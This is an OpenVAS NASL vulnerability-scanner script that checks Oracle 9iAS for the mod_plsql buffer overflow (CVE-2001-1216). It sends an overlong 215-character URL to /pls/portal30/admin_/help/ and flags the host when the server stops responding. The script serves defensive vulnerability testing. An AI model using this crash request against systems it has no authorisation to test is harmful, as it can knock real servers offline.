# OpenVAS Vulnerability Test
# $Id: oracle9i_mod_plsql_overflow.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: Oracle 9iAS mod_plsql Buffer Overflow
#
# Authors:
# Matt Moore <matt@westpoint.ltd.uk>
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Oracle 9i Application Server uses Apache as it's web
server. There is a buffer overflow in the mod_plsql module
which allows an attacker to run arbitrary code.";

tag_solution = "Oracle have released a patch for this vulnerability, which
is available from:

http://metalink.oracle.com";


if(description)
{
 script_id(10840);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3726);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2001-1216");
 name = "Oracle 9iAS mod_plsql Buffer Overflow";
 
 script_name(name);
 

 script_xref(name : "URL" , value : "http://www.nextgenss.com/advisories/plsql.txt");
 script_xref(name : "URL" , value : "http://otn.oracle.com/deploy/security/pdf/modplsql.pdf");

 
 script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002 Matt Moore");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/OracleApache");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
# 

include("http_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
# Send 215 chars at the end of the URL
  buf = http_get(item:string("/XXX/XXXXXXXX/XXXXXXX/XXXX/", crap(215)), port:port);
  send(socket:soc, data:buf);
  recv = http_recv(socket:soc);
  if ( ! recv ) exit(0);
  close(soc);

  soc = http_open_socket(port);
  if ( ! soc ) exit(0);
  
  buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
  send(socket:soc, data:buf);
 
 unbreakable = http_recv(socket:soc);
 if(!unbreakable)
	security_message(port);
  
  } else {
   http_close_socket(soc);
  }
 }
